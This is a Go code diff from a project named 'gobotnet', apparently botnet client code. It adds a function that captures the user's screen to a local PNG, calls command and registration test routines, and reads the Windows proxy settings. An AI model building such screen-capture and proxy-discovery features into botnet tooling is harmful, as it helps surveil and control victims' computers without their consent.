@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
-	"gobotnet/command"
-	//"gobotnet/registration"
+	"github.com/vova616/screenshot"
+	"gobotnet"
+	"image/png"
 	"net/url"
+	"os"
 	"os/exec"
 	"syscall"
 	"time"
@@ -83,5 +85,23 @@ func CStringToString(cs CString) (s string) {
 func main() {
 	fmt.Println(GetIEProxyFromWinHttp())
 	defer syscall.FreeLibrary(winhttpdll)
-	prgCmd.CmdTest()
+	gobotnet.CmdTest()
+	gobotnet.RegTest()
+	makeScreenshot()
+}
+
+func makeScreenshot() {
+	img, err := screenshot.CaptureScreen()
+	if err != nil {
+		panic(err)
+	}
+	f, err := os.Create("./ss.png")
+	if err != nil {
+		panic(err)
+	}
+	err = png.Encode(f, img)
+	if err != nil {
+		panic(err)
+	}
+	f.Close()
 }
